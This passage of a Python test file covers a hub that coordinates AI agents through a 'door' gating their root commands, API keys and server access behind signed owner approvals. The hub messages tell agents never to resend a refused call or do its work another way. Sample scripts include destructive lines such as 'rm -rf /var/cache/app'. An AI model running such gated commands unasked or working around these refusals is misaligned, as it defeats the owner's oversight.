               "details": STEPS}
        with patch.object(hub, "chat_context", return_value=False), \
                patch.object(hub, "contact_session", return_value=False), \
                patch.object(hub, "parse_task", return_value=None):
            with self.assertRaisesRegex(hub.ToolError, "Several agents hold servers through the door .vps, studio.: "
                                                       "name in give_to"):
                hub.t_request_secret("manager", dict(ask))
            with self.assertRaisesRegex(hub.ToolError, "for no agent yet: ask your requester"):
                hub.t_request_secret("vps", dict(ask))              # a holder does not give itself a key
            for wrong in ({"lead": "use"}, {"vps": "use", "studio": "use"}, {"nobody": "use"}):
                with self.subTest(give_to=wrong), self.assertRaisesRegex(hub.ToolError, "give_to names one agent"):
                    hub.t_request_secret("manager", dict(ask, give_to=wrong))
            self.assertNotIn("agents", self.origin_team()["door"]["credentials"]["cloudflare:acme"])
            said = hub.t_request_secret("manager", dict(ask, give_to={"vps": "use"}))
            self.assertIn("it uses it for vps from the owner's Mac's next door round, usually within 10 minutes while "
                          "the Mac's app runs (", said)
            self.assertIn("with nothing to type; then `ops` takes it. " + hub.DOOR_EARLY_REFUSAL + " " +
                          hub.DOOR_EARLY_TASK, said)                # vps, not the manager, meets the refusal
            self.assertEqual(self.origin_team()["door"]["credentials"]["cloudflare:acme"],
                             {"secret": self.ref, "agents": ["vps"]})
            with self.assertRaises(hub.ToolError) as held:  # vps asks after the door refused it, before the Mac's round
                hub.t_request_secret("vps", dict(ask))
            self.assertIn("already holds cloudflare:acme for you, so there is nothing to type: `ops` takes it. The "
                          "door acts on this from the owner's Mac's next door round after the change",
                          str(held.exception))
            self.assertIn(hub.DOOR_EARLY_REFUSAL, str(held.exception))
            self.assertIn(f'If the provider refuses its value, ask again with failed="{self.ref}".',
                          str(held.exception))
            with self.assertRaisesRegex(hub.ToolError, "for vps: ask your requester to give that part of the work to "
                                                       "vps"):
                hub.t_request_secret("studio", dict(ask))
            with self.assertRaisesRegex(hub.ToolError, "for vps: give that part of the work to vps"):
                hub.t_request_secret("manager", dict(ask, give_to={"studio": "use"}))
            self.assertFalse(hub.q("SELECT 1 FROM needs WHERE kind='secret'"))  # no card asked the owner to type
            # a new card keeps the name, and the owner's Save gives the key to that holder
            hub.t_request_secret("manager", dict(ask, door="cloudflare:new", give_to={"studio": "use"}))
        nid = hub.q1("SELECT max(id) AS id FROM needs WHERE kind='secret'")["id"]
        self.assertEqual(hub.need_secret(hub.q1("SELECT * FROM needs WHERE id=?", (nid,)))["door_user"], "studio")
        status, answer = self.owner(f"/ui/needs/{nid}/secret", login=self.ref)
        self.assertEqual(status, 200, answer)
        # the answer wakes the asker's waiting task at once, and the door takes the key only at the Mac's next round
        self.assertIn("The door uses it for studio from the owner's Mac's next door round", answer["answer"])
        self.assertIn(hub.DOOR_EARLY_REFUSAL, answer["answer"])
        self.assertEqual(self.origin_team()["door"]["credentials"]["cloudflare:new"]["agents"], ["studio"])
        # a card that names a holder which then loses its last server gives the key to nobody, never to another
        with patch.object(hub, "chat_context", return_value=False), \
                patch.object(hub, "contact_session", return_value=False), \
                patch.object(hub, "parse_task", return_value=None):
            hub.t_request_secret("manager", dict(ask, door="cloudflare:late", give_to={"studio": "use"}))
        late = hub.q1("SELECT max(id) AS id FROM needs WHERE kind='secret'")["id"]
        self.grant(agent="studio", server="web-2", level=None)          # now vps is the one holder
        status, answer = self.owner(f"/ui/needs/{late}/secret", login=self.ref)
        self.assertEqual(status, 200, answer)
        self.assertNotIn("agents", self.origin_team()["door"]["credentials"]["cloudflare:late"])
        self.grant(agent="studio", server="web-2", level="fix")
        # an agent with no server is no caller of the door: its keys wait in team.json and leave the app's view
        self.grant(level=None)
        self.assertEqual(self.origin_team()["door"]["credentials"]["cloudflare:acme"]["agents"], ["vps"])
        view = self.request("/ui/door?db=test-generation", source=OWNER)[1]
        self.assertEqual((view["credentials"]["cloudflare:acme"]["agents"],
                          view["credentials"]["cloudflare:new"]["agents"]), ([], ["studio"]))

    def test_door_fleet_names_the_agent_that_holds_the_fleet_s_own_servers(self):
        """The manager names the DevOps agent (door_fleet), and GET /ui/door gives the app the fleet's Linux servers,
        that name and the manager. The app decides: it takes a server and an agent only by what its own Tailscale and
        the servers themselves say. A rename and a removal follow, as for the door's other names."""
        team = self.origin_team()
        team["servers"] = {name: {"kind": "linux", "user": "fleet"} for name in ("vps", "lead-box")}
        self.write_team(team)
        view = self.request("/ui/door?db=test-generation", source=OWNER)[1]
        self.assertEqual(view["fleet"], {"servers": {"hub": hub.TEAM["addresses"]["hub"], "lead-box": "127.0.0.9",
                                                     "vps": hub.TEAM["addresses"]["vps"]},
                                         "holder": None, "manager": None})      # the manager runs on the hub's server
        self.assertIn("door_fleet", [t["name"] for t in hub.tools_for("manager")])
        self.assertNotIn("door_fleet", [t["name"] for t in hub.tools_for("vps", ("vps", "T-1", "1"))])
        base = {"agent": "lead", "why": "the owner named it for the fleet's servers"}
        with self.no_door_round(hub.now() - 180):
            said = hub.t_door_fleet("manager", dict(base, request_id="fleet-test-1"))
            # until the Mac's round gives Lead the servers, the hub records no holder of them, and a blocked agent's
            # question sent the work to Lead with no word of that round, while the door refuses Lead's calls
            for line in (hub.access_route("studio", "server:vps", "manager", "patch"),
                         hub.grant_check("studio", "server:vps", "patch")):
                self.assertIn("Who holds the fleet's own servers changed with door_fleet", line)
                self.assertIn("and the hub records the holder then. " + hub.DOOR_EARLY_REFUSAL + " " +
                              hub.DOOR_EARLY_TASK, line)
            hub.DOOR_HELD["at"] = hub.now() + 1             # the Mac's word: the door's file holds a later view
            self.assertNotIn("changed with door_fleet", hub.access_route("studio", "server:vps", "manager", "patch"))
            hub.door_changes_sweep(hub.now())
            self.assertEqual(hub.door_changes(), {})        # so a hub that starts again reads nothing old as new
        self.assertIn("Lead holds the fleet's own servers through the door once the owner's app has put the door's "
                      "parts on them: fixed root forms and `ops <server> health`", said)
        # it invites a task at once, and the door takes Lead's calls only from the Mac's next round: the words say so,
        # with when that Mac's last round started (a Mac that runs no round shows), and the task says so to Lead
        self.assertIn("Give it the work on such a server with create_task. The door acts on this from the owner's "
                      "Mac's next door round after the change, usually within 10 minutes while the Mac's app runs "
                      "(its last door round started 3 minutes ago); until then it acts as before. " +
                      hub.DOOR_EARLY_REFUSAL + " " + hub.DOOR_EARLY_TASK, said)
        self.assertEqual(self.origin_team()["door"]["fleet"], "lead")
        self.assertEqual(hub.t_door_fleet("manager", dict(base, request_id="fleet-test-1")), said)      # one command
        self.assertIn("It was so already", hub.t_door_fleet("manager", dict(base, request_id="fleet-test-2")))
        self.assertEqual(self.request("/ui/door?db=test-generation", source=OWNER)[1]["fleet"]["holder"], "lead")
        # the door knows a caller by its server's address: an agent on a Mac or beside another agent is refused
        for agent, why in (("studio", "runs on no Linux server of the fleet"), ("ghost", "no agent of this fleet")):
            with self.subTest(agent=agent), self.assertRaisesRegex(hub.ToolError, why):
                hub.t_door_fleet("manager", {"request_id": "fleet-test-9", "agent": agent, "why": "a test"})
        team = self.origin_team()
        team["agents"]["scout"] = {"role": "worker", "runtime": "codex", "machine": "vps", "can": ["shell"]}
        self.write_team(team)
        with self.assertRaisesRegex(hub.ToolError, "Vps shares vps with Scout: the door knows a caller by its "
                                                   "server's address"):
            hub.t_door_fleet("manager", {"request_id": "fleet-test-8", "agent": "vps", "why": "a test"})
        for bad in ({"agent": ""}, {"agent": "lead", "why": ""}):
            with self.subTest(bad=bad), self.assertRaises(hub.ToolError):
                hub.t_door_fleet("manager", dict({"request_id": "fleet-test-7", "why": "a test"}, **bad))
        # a rename and a removal
        team = self.origin_team()
        self.assertEqual(hub.renamed_team(team, "lead", "ops")["door"]["fleet"], "ops")
        gone = hub.removed_team(team, "lead")
        self.assertNotIn("fleet", gone["door"])
        hub.validate_team(gone)
        team["door"]["fleet"] = "nobody"
        with self.assertRaisesRegex(ValueError, "door.fleet names the agent that holds the fleet's own servers"):
            hub.validate_door(team)
        said = hub.t_door_fleet("manager", {"request_id": "fleet-test-3", "agent": "none", "why": "it left"})
        self.assertIn("No agent is named for the fleet's own servers now", said)
        self.assertIn("to you when you run alone on a server that is not the hub's", said)
        self.assertNotIn("fleet", self.origin_team()["door"])

    def test_an_agent_on_the_hub_s_server_holds_none_of_the_fleet_s_own_servers(self):
        """The door takes no caller at the hub's own address, and the owner's app gives such an agent nothing: so the
        hub names no manager that runs there, and door_fleet refuses an agent there with the reason."""
        self.assertEqual(hub.TEAM["agents"]["manager"]["machine"], "hub")
        view = self.request("/ui/door?db=test-generation", source=OWNER)[1]
        self.assertIsNone(view["fleet"]["manager"])
        with self.assertRaisesRegex(hub.ToolError, "Manager runs on the hub's server, and the door takes no caller at "
                                                   "the hub's own address"):
            hub.t_door_fleet("manager", {"request_id": "fleet-test-5", "agent": "manager", "why": "a test"})
        team = self.origin_team()
        team["addresses"]["manager-box"] = "127.0.0.31"
        team["servers"] = {"manager-box": {"kind": "linux", "user": "fleet"}}
        team["agents"]["manager"]["machine"] = "manager-box"
        self.write_team(team)
        self.assertEqual(self.request("/ui/door?db=test-generation", source=OWNER)[1]["fleet"]["manager"], "manager")
        self.assertIn("Manager holds the fleet's own servers", hub.t_door_fleet(
            "manager", {"request_id": "fleet-test-6", "agent": "manager", "why": "the fleet has no DevOps agent"}))

    def test_a_blocked_agent_that_names_one_of_the_fleet_s_own_servers_gets_its_holder_and_no_step_for_the_owner(self):
        """In a fleet with a door. Each reader gets its own line: the manager the tool that names the holder, a lead
        the way up, and the holder that asks for more than patch the fact that no agent gets more there."""
        team = self.origin_team()
        team["servers"] = {"vps": {"kind": "linux", "user": "fleet"}}
        self.write_team(team)
        self.assertTrue(hub.fleet_server("vps"))
        line = hub.access_route("studio", "server:vps", "manager", "fix")
        self.assertIn("vps is one of the fleet's own servers, which the owner's app gives to one agent, all together, "
                      "at patch: the agent that you name with door_fleet", line)
        self.assertIn("raise no Needs-you item that asks the owner for a root command", line)
        self.assertNotIn("say what the work needs it for", line)
        self.assertIn("the agent that you name with door_fleet", hub.access_route("studio", "server:vps", "manager"))
        said = hub.access_route("studio", "server:vps", "lead", "fix", restarts="manager")      # a lead reads it
        self.assertIn("It is one of the fleet's own servers, which no agent holds yet: the manager names the agent "
                      "that holds them. Pass the question up with answer(..., pass_up=true).", said)
        self.assertNotIn("you name", said)
        self.assertNotIn("The manager cannot settle it either", said)
        self.assertEqual(self.grant(agent="lead", server="vps", level="patch")[0], 200)
        line = hub.access_route("studio", "server:vps", "manager", "fix")
        self.assertIn("Held now by lead (patch): lead can do this part of the work", line)
        self.assertIn("give that part to lead with create_task", line)
        self.assertNotIn("door_fleet", line)
        # the holder itself, after the door refused a command of its own there
        own = hub.access_route("lead", "server:vps", "manager", "fix")
        self.assertIn("at patch only, which does not reach fix", own)
        self.assertIn("patch is the most that any agent gets on a machine of the fleet: the fixed root forms, and no "
                      "command, file or script of its own. If the work cannot be done with them, raise a Needs-you "
                      "item that says what the server needs and why.", own)
        self.assertNotIn("Give the work on vps to that agent", own)
        self.assertIn("at patch already", hub.access_route("lead", "server:vps", "manager", "patch"))
        # the manager's own grant tool says the same as the route
        self.assertIn("the agent that you name with door_fleet", hub.grant_check("studio", "server:vps", "patch"))
        # door_fleet moves them to Vps: Lead stays in the record until the Mac's round, and the line that gave Lead the
        # work said nothing of the move, which the door makes at that round, maybe in the middle of that task
        with self.no_door_round():
            hub.t_door_fleet("manager", {"request_id": "fleet-test-10", "agent": "vps", "why": "a test"})
            line = hub.access_route("studio", "server:vps", "manager", "fix")
        self.assertIn("Held now by lead (patch)", line)
        self.assertIn("Who holds the fleet's own servers changed with door_fleet", line)

    def test_door_fleet_needs_a_door(self):
        team = self.origin_team()
        del team["door"]
        team["servers"] = {"lead-box": {"kind": "linux", "user": "fleet"}}
        self.write_team(team)
        with self.assertRaisesRegex(hub.ToolError, "This fleet has no door"):
            hub.t_door_fleet("manager", {"request_id": "fleet-test-4", "agent": "lead", "why": "a test"})

    def test_a_deleted_agent_leaves_the_door_s_lists(self):
        """removed_team left the agent's name in the door's lists of agents, so validate_door refused the delete of
        any agent with a key of the door or a GitOps target (400). Its name leaves them: a key that only it used
        stays with the door for nobody, and a GitOps target that only it had ends."""
        self.grant(level="fix")
        self.grant(agent="studio", server="web-2", level="fix")
        self.door_key(users=["studio", "vps"])
        team = self.origin_team()
        team["door"]["credentials"]["cloudflare:two"] = {"secret": self.ref, "agents": ["vps"]}
        team["door"]["gitops"] = {"acme/gitops": {"sync": "s.yml", "agents": ["vps"]},
                                  "acme/both": {"sync": "s.yml", "agents": ["studio", "vps"]}}
        hub.validate_door(team)
        gone = hub.removed_team(team, "vps")
        hub.validate_team(gone)
        self.assertEqual(gone["door"]["credentials"], {"cloudflare:acme": {"secret": self.ref, "agents": ["studio"]},
                                                       "cloudflare:two": {"secret": self.ref}})
        self.assertEqual(gone["door"]["gitops"], {"acme/both": {"sync": "s.yml", "agents": ["studio"]}})
        self.assertNotIn("gitops", hub.removed_team(gone, "studio")["door"])
        self.assertEqual(team["door"]["gitops"]["acme/gitops"]["agents"], ["vps"])     # the caller's copy is whole

    def test_a_door_key_needs_no_env(self):
        """The coordinator, 7 November 2026: the manager's and an agent's first request for a door key were both
        refused for want of env, which no agent reads. The hub names the key in the vault after its door name. A name
        that the request gives and that breaks a rule gets that rule (F18), never the words for a name that is too
        long, which are about the hub's own name. A setting whose name starts with the app's own name does not repeat
        it (the supervisor's finding of 26 November 2026: DOOR_APP_ACME_CRM_ACME_CRM_REPORT_READ_KEY on the owner's
        screen)."""
        for door, env in (("Cloudflare:Acme", "DOOR_CLOUDFLARE_ACME_KEY"),
                          ("app:shop:STRIPE_SECRET_KEY", "DOOR_APP_SHOP_STRIPE_SECRET_KEY"),
                          ("app:acme-crm:ACME_CRM_REPORT_READ_KEY", "DOOR_APP_ACME_CRM_REPORT_READ_KEY"),
                          ("app:shop:SHOPIFY_TOKEN", "DOOR_APP_SHOP_SHOPIFY_TOKEN")):
            with self.subTest(door=door):
                hub.t_request_secret("manager", {"kind": "api_key", "door": door, "why": "a test", "details": STEPS})
                nid = hub.q1("SELECT max(id) AS id FROM needs WHERE kind='secret'")["id"]
                self.assertEqual(hub.need_secret(hub.q1("SELECT * FROM needs WHERE id=?", (nid,)))["env"], env)
        # Two settings never share one name: app:shop:SHOP_TOKEN takes DOOR_APP_SHOP_TOKEN, so app:shop:TOKEN, whose
        # only name that is, must give env; app:crm:X_KEY holds DOOR_APP_CRM_X_KEY, so app:crm:CRM_X_KEY takes the whole
        # name; a request again of an open card's door name joins that card (the Door area's readers). Bug: the second
        # setting joins the first one's card, or gets "nothing to type" for the other's key.
        hub.q("DELETE FROM needs WHERE kind='secret'")      # one asker waits for five cards at most
        for door, env in (("app:shop:SHOP_TOKEN", "DOOR_APP_SHOP_TOKEN"), ("app:crm:X_KEY", "DOOR_APP_CRM_X_KEY"),
                          ("app:crm:CRM_X_KEY", "DOOR_APP_CRM_CRM_X_KEY")):
            with self.subTest(door=door):
                hub.t_request_secret("manager", {"kind": "api_key", "door": door, "why": "a test", "details": STEPS})
                nid = hub.q1("SELECT max(id) AS id FROM needs WHERE kind='secret'")["id"]
                self.assertEqual(hub.need_secret(hub.q1("SELECT * FROM needs WHERE id=?", (nid,)))["env"], env)
        self.assertEqual(hub.door_request_env("app:crm:CRM_X_KEY"), "DOOR_APP_CRM_CRM_X_KEY")    # its open card's name
        with self.assertRaisesRegex(hub.ToolError, "already has the vault's name for app:shop:TOKEN: give env"):
            hub.t_request_secret("manager", {"kind": "api_key", "door": "app:shop:TOKEN", "why": "a test",
                                             "details": STEPS})
        # an open card of the old long name keeps its name for a request again (the card that the owner saw), and a
        # key of the catalog holds its name as an open card does
        hub.q("DELETE FROM needs WHERE kind='secret'")
        hub.t_request_secret("manager", {"kind": "api_key", "door": "app:crm:CRM_Y_KEY", "env": "DOOR_APP_CRM_CRM_Y_KEY",
                                         "why": "a test", "details": STEPS})
        self.assertEqual(hub.door_request_env("app:crm:CRM_Y_KEY"), "DOOR_APP_CRM_CRM_Y_KEY")
        hub.q("DELETE FROM needs WHERE kind='secret'")
        held = "bws://0000aaaa-0000-4000-8000-000000000077"
        hub.TEAM.setdefault("logins", {})[held] = {"title": "DOOR_APP_SHOP_TOKEN", "kind": "api_key",
                                                    "env": "DOOR_APP_SHOP_TOKEN"}
        self.addCleanup(hub.TEAM["logins"].pop, held, None)
        with self.assertRaisesRegex(hub.ToolError, "already has the vault's name for app:shop:TOKEN: give env"):
            hub.t_request_secret("manager", {"kind": "api_key", "door": "app:shop:TOKEN", "why": "a test",
                                             "details": STEPS})
        with self.assertRaisesRegex(hub.ToolError, "give env, a shorter name"):
            hub.t_request_secret("manager", {"kind": "api_key", "door": "app:shop:" + "A" * 60 + "_KEY",
                                             "why": "a test"})
        with self.assertRaisesRegex(hub.ToolError, "CLOUDFLARE_AUTHKEY does not end as an API key's name does: .* for "
                                                   "example CLOUDFLARE_AUTH_KEY"):
            hub.t_request_secret("manager", {"kind": "api_key", "door": "cloudflare:two", "env": "CLOUDFLARE_AUTHKEY",
                                             "why": "a test", "details": STEPS})

    def test_nobody_can_ask_for_a_model_key_for_the_door(self):
        """The owner, 11 November 2026: "no, I dont want any api key! it needs to be the agent itself". The door calls
        no model, so model is no name of its rules: request_secret refuses it, for the manager and for a worker, and
        so does team.json."""
        for agent in ("manager", "vps"):
            with self.subTest(agent=agent), self.assertRaisesRegex(hub.ToolError, "door is the key's name"):
                hub.t_request_secret(agent, {"kind": "api_key", "door": "model", "why": "a test",
                                             "task_id": "T-1"})
            # nor for an Azure account, which needs a tenant and a client id beside its key, that no card gives: a card
            # for it would ask the owner for a key that the door cannot use (a Fable read of 22 November 2026)
            with self.subTest(agent=agent, door="azure"), \
                    self.assertRaisesRegex(hub.ToolError, "Ask for no key of azure:one: an azure account of the door"):
                hub.t_request_secret(agent, {"kind": "api_key", "door": "azure:one", "why": "a test",
                                             "task_id": "T-1"})
        self.assertIsNone(hub.q1("SELECT id FROM needs WHERE kind='secret'"))
        self.owner("/ui/secrets/grant", login=self.ref, agent="door", grant="use")
        team = json.loads(json.dumps(self.origin_team()))
        team["door"]["credentials"] = {"model": {"secret": self.ref}}
        with self.assertRaisesRegex(ValueError, "'model' is not <provider>:<account>"):
            hub.validate_door(team)

    def test_the_door_reads_the_release_that_the_hub_runs(self):
        """DevOps plan 13, item 2: GET /door/release carries the hub's signed manifest, and only to the door's address;
        the door checks it with its own pinned keys."""
        manifest = {"version": "2026.11.9", "revision": "cd" * 20, "signature": "c2ln"}
        (self.kit / "release.json").write_text(json.dumps(manifest))
        self.assertEqual(self.request("/door/release", source=OWNER)[0], 403)
        self.assertEqual(self.request("/door/release", source=DOOR), (200, manifest))
        (self.kit / "release.json").unlink()
        self.assertEqual(self.request("/door/release", source=DOOR)[0], 404)

    def test_a_sealed_copy_waits_for_the_door_s_own_address(self):
        self.owner("/ui/secrets/grant", login=self.ref, agent="door", grant="use")
        armor = base64.b64encode(b"age-encryption.org/v1\n-> X25519 abc\nxyz\n--- mac\nbody").decode()
        sealed = ("-----BEGIN AGE ENCRYPTED FILE-----\n" +
                  "".join(armor[i:i + 64] + "\n" for i in range(0, len(armor), 64)) +
                  "-----END AGE ENCRYPTED FILE-----\n")
        copy = hub.door_deliver(self.ref, sealed)
        self.assertEqual(self.request("/door/sealed", source=OWNER)[0], 403)
        status, answer = self.request("/door/sealed", source=DOOR)
        self.assertEqual((status, answer["copies"]), (200, [{"id": copy, "login": self.ref, "sealed": sealed}]))
        self.assertEqual(self.request(f"/door/sealed/{copy}", {"sha256": "a" * 64}, source=OWNER)[0], 403)
        status, answer = self.request(f"/door/sealed/{copy}", {"sha256": "a" * 64}, source=DOOR)
        self.assertEqual((status, answer), (200, {"id": copy, "fetched": True}))
        self.assertEqual(self.request("/door/sealed", source=DOOR)[1]["copies"], [])
        row = hub.q1("SELECT sealed, sha256 FROM door_copies WHERE id=?", (copy,))
        self.assertEqual((row["sealed"], row["sha256"]), ("", "a" * 64))
        with self.assertRaises(hub.Refusal):
            hub.door_deliver("bws://00000002-0000-4000-8000-000000000000", sealed)

    def test_the_owners_signed_yes_to_a_door_call_reaches_only_the_door(self):
        """DevOps plan 5.4 (D11, D22): the manager names the call hash that the door refused; the app signs the
        owner's yes to it, the hub keeps it with his answer, and only the door's address reads it."""
        call = refusal("c" * 64)
        said = hub.t_raise_needs_you("manager", {"title": "Start the release runner", "why": "It adds cost",
                                                 "what_to_do": "Answer yes, and the door runs ops aws:acme call ec2 "
                                                               "RunInstances once", "door_call": call,
                                                 "options": ["Yes, run it once", "No"]})
        self.assertIn("lets that exact call through once", said)
        nid = int(said.split("N-")[1].split(".")[0])
        item = hub.need_view(hub.q1("SELECT * FROM needs WHERE id=?", (nid,)))
        self.assertEqual(item["door_call"], call)
        self.assertNotIn("approval", item)
        fleet, at = hub.fleet_id(), round(hub.now())

        def door_call(**more):
            return json.dumps(dict({"v": 1, "kind": "door-call", "fleet": fleet, "need": nid, "call": call, "at": at},
                                   **more), sort_keys=True, separators=(",", ":"))
        yes = door_call()
        # and what the door would refuse (door.approval), which would close the item with no yes at the door (a
        # review of 20 November 2026: a Mac whose clock is six minutes fast)
        for wrong, choice, why in ((yes.replace(call, "d" * 64), 0, "this item's door call"),
                                   (yes + " ", 0, "canonical form"), (yes, 1, "only the first option"),
                                   (door_call(fleet="another-fleet"), 0, "not of this fleet"),
                                   (door_call(at=at + 360), 0, "in the future by the hub's clock"),
                                   (door_call(at=at - hub.DOOR_APPROVAL_DAYS * 86400 - 60), 0, "older than the door"),
                                   (door_call(v=True), 0, "canonical form"), (door_call(need=float(nid)), 0,
                                                                              "canonical form"),
                                   (door_call(at=float(at)), 0, "canonical form")):
            status, answer = self.owner(f"/ui/needs/{nid}", choice=choice, statement=wrong, signature="c2ln")
            self.assertEqual(status, 400, answer)
            self.assertIn(why, answer["error"])
        status, answer = self.owner(f"/ui/needs/{nid}", choice=0)
        self.assertEqual(status, 409, answer)
        self.assertIn("owner key on the Mac", answer["error"])
        self.assertIsNone(hub.q1("SELECT answer FROM needs WHERE id=?", (nid,))["answer"])
        status, answer = self.owner(f"/ui/needs/{nid}", choice=0, statement=yes, signature="c2ln")
        self.assertEqual(status, 200, answer)
        self.assertEqual(self.request("/door/approvals", source=OWNER)[0], 403)
        status, answer = self.request("/door/approvals", source=DOOR)
        self.assertEqual((status, answer["approvals"]), (200, [{"need": nid, "statement": yes, "signature": "c2ln"}]))
        plain = hub.t_raise_needs_you("manager", {"title": "Which name", "why": "The owner names it",
                                                  "what_to_do": "Answer with a name", "reason": "person"})
        status, answer = self.owner(f"/ui/needs/{int(plain.split('N-')[1].split('.')[0])}", answer="Yes",
                                    statement=yes, signature="c2ln")
        self.assertEqual((status, answer.get("error")), (400, "this Needs-you item names no door call"))
        for bad in ({"door_call": "not a hash", "options": ["Yes", "No"]}, {"door_call": call}):
            with self.assertRaises(hub.ToolError):
                hub.t_raise_needs_you("manager", dict({"title": "Start it", "why": "It adds cost",
                                                       "what_to_do": "Say yes"}, **bad))

    def test_the_task_of_a_door_card_hears_run_it_once_and_no(self):
        """A review of 20 November 2026 (T-1566): the owner's press on the door's card reached only the manager, which
        raised it, and the task that the card is for asked every two hours. His Run it once, his No and his words
        reach that task in the same write now, with no quiet mark, on the app and on the hub's own board, also for a
        card of a call that is no run; the manager reads that the hub told it and which question of that task still
        waits; Full access stays the door's own news; a card whose question is that task's own answers it once; an
        ended task hears nothing; and a No takes nothing from another card's yes."""
        self.grant(agent="vps", server="web-1", level="fix")

        def card(script, task=None, **more):
            task = task or hub.ins("INSERT INTO tasks(title,owner,state) VALUES('Rotate the logs','vps','working')")
            fields = run_card(script=script, **more)
            hub.q("UPDATE door_record SET task=? WHERE call=?", (f"T-{task}", fields["door_call"]))
            nid = int(hub.t_raise_needs_you("manager", fields).split("N-")[1].split(".")[0])
            return task, nid, fields["door_call"], hub.need_title(hub.q1("SELECT * FROM needs WHERE id=?", (nid,)))

        def said(agent, task=None):
            return [r["text"] for r in hub.q("SELECT text FROM events WHERE agent=? AND kind='say' AND "
                                             "(? IS NULL OR task=?) ORDER BY id", (agent, task, task))]

        def question(task):
            return hub.ins("INSERT INTO questions(task,asker,requester,text,asked) VALUES(?,'vps','manager',"
                           "'Has the owner answered?',?)", (task, hub.now()))

        def run_once(nid, call):
            yes = json.dumps({"v": 1, "kind": "door-call", "fleet": hub.fleet_id(), "need": nid, "call": call,
                              "at": round(hub.now())}, sort_keys=True, separators=(",", ":"))
            self.assertEqual(self.owner(f"/ui/needs/{nid}", choice=0, statement=yes, signature="c2ln")[0], 200)
        once, nid, call, title = card("logrotate -f /etc/logrotate.conf\n")
        asked = question(once)
        run_once(nid, call)
        first = nid
        self.assertEqual(said("vps", once), [
            f"[hub] The owner pressed \"Run it once\" on N-{nid} ({title}): the door lets that call through one time. "
            f"Send the same script again, character for character, and go on with the task; a call that already ran "
            f"needs nothing more. If the door refuses it again, send it once more after one minute, and if it still "
            f"refuses it, send it no more and give your requester the door's own words."])
        self.assertEqual(hub.q1("SELECT extra FROM events WHERE task=? AND kind='say'", (once,))["extra"], "{}")
        self.assertIn(f"The hub gave T-{once}, the task that the card is for, this answer and what the door does now: "
                      f"do not pass it on again. Its question Q-{asked} still waits: answer it too, because this "
                      f"answer closes no question of T-{once}.", said("manager")[-1])
        # a second card of the same call, answered No: that call keeps the first card's yes, and the manager reads why
        _, again, _, _ = card("logrotate -f /etc/logrotate.conf\n", task=once)
        self.assertEqual(self.owner(f"/ui/needs/{again}", choice=2)[0], 200)
        self.assertEqual(len(said("vps", once)), 1)
        self.assertIn(f"The hub told T-{once} nothing: the owner's signed answer to that call on N-{first} stands.",
                      said("manager")[-1])
        no, nid, _, title = card("journalctl --vacuum-time=7d\n")
        self.assertEqual(self.owner(f"/ui/needs/{nid}", choice=2)[0], 200)
        refused = (f"[hub] The owner answered N-{{}} ({{}}): \"No\". This answer gives that call no yes: do not send it "
                   f"again, and do not do its work another way. Ask your requester what to do instead, unless your "
                   f"question about it is still open.")
        self.assertEqual(said("vps", no), [refused.format(nid, title)])
        # the same No on the hub's own board
        board, nid, _, title = card("journalctl --vacuum-size=1G\n")
        status, _ = self.request(f"/needs/{nid}", {"choice": "2"}, source=OWNER,
                                 headers={"Content-Type": "application/json", "Accept": "application/json"})
        self.assertIn(status, (200, 303))
        self.assertEqual(said("vps", board), [refused.format(nid, title)])
        words, nid, _, title = card("du -sh /srv\n")
        self.assertEqual(self.owner(f"/ui/needs/{nid}", answer="Why root?")[0], 200)
        self.assertEqual(said("vps", words), [f"[hub] The owner answered N-{nid} ({title}) in words, which give the "
                                              f"door no yes: \"Why root?\". manager, which raised the card, tells you "
                                              f"what comes next: do not end the task for this, and do not send that "
                                              f"call again until it does."])
        self.assertIn("these words and told it to wait for you: tell it what comes next.", said("manager")[-1])
        # Full access: nothing here, because the task hears it when the door has it (door_mode_news)
        full, nid, _, _ = card("ls /var/log\n")
        waits = question(full)
        mode = json.dumps({"v": 1, "kind": "door-mode", "fleet": hub.fleet_id(), "host": "web-1", "mode": "full",
                           "at": int(time.time())}, sort_keys=True, separators=(",", ":"))
        status, answer = self.owner(f"/ui/needs/{nid}", choice=1, statement=mode, signature="c2ln")
        self.assertEqual(status, 200, answer)
        self.assertEqual(said("vps", full), [])
        self.assertIn(f"The door tells T-{full} when it has Full access on web-1: do not pass it on. Its question "
                      f"Q-{waits} still waits", said("manager")[-1])
        # a card of a call that is no run tells its task too, and takes one answer
        delete = hub.ins("INSERT INTO tasks(title,owner,state) VALUES('Delete the July copies','vps','working')")
        call = refusal("e" * 64, "aws:acme", "delete")
        hub.q("UPDATE door_record SET task=? WHERE call=?", (f"T-{delete}", call))
        fields = {"title": "Delete the July copies?", "why": "They fill the disk", "door_call": call,
                  "what_to_do": "Answer yes, and the door lets ops aws:acme delete through once",
                  "options": ["Yes, delete them once", "No"]}
        with self.assertRaises(hub.ToolError):
            hub.t_raise_needs_you("manager", dict(fields, multi=True))
        nid = int(hub.t_raise_needs_you("manager", fields).split("N-")[1].split(".")[0])
        run_once(nid, call)
        self.assertTrue(said("vps", delete)[0].startswith(
            f"[hub] The owner pressed \"Yes, delete them once\" on N-{nid} (Delete the July copies?): the door lets "
            f"that call through one time. Send the same call again, character for character"), said("vps", delete))
        # an ended task hears nothing, and a card whose question is the task's own answers that question once
        ended, nid, _, _ = card("ls /etc\n")
        hub.q("UPDATE tasks SET state='canceled' WHERE id=?", (ended,))
        self.assertEqual(self.owner(f"/ui/needs/{nid}", choice=2)[0], 200)
        self.assertEqual(said("vps", ended), [])
        own = hub.ins("INSERT INTO tasks(title,owner,state,requester) VALUES('Clean the cache','vps','input-required',"
                      "'manager')")
        mine = question(own)
        hub.q("UPDATE tasks SET waiting_on=? WHERE id=?", (f"Q-{mine}", own))
        _, nid, _, _ = card("rm -rf /var/cache/app\n", task=own, question_id=f"Q-{mine}")
        self.assertEqual(self.owner(f"/ui/needs/{nid}", choice=2)[0], 200)
        self.assertEqual(len(said("vps", own)), 1)                  # the answer of its question, once
        self.assertNotIn("the task that the card is for", said("manager")[-1])

    def test_one_job_on_one_server_is_one_door_card(self):
        """The owner, 21 November 2026, of six cards that read the same, the six parts of one root script of 13,152
        characters for one task on one server: "every time the same?", and "One part at a time". One open card for
        one job, whose next card comes after his answer (this test held the interim rule of one part at a time
        before, in place). Bug: the manager raises the parts of one job as several open cards, or one call twice,
        and he presses six times for one job."""
        self.grant(agent="vps", server="web-1", level="fix")
        self.grant(agent="vps", server="web-2", level="fix")
        setup = hub.ins("INSERT INTO tasks(title,owner,state) VALUES('Set up the acme worker','vps','working')")
        logs = hub.ins("INSERT INTO tasks(title,owner,state) VALUES('Rotate the acme logs','vps','working')")

        def card(script, task=setup, **more):
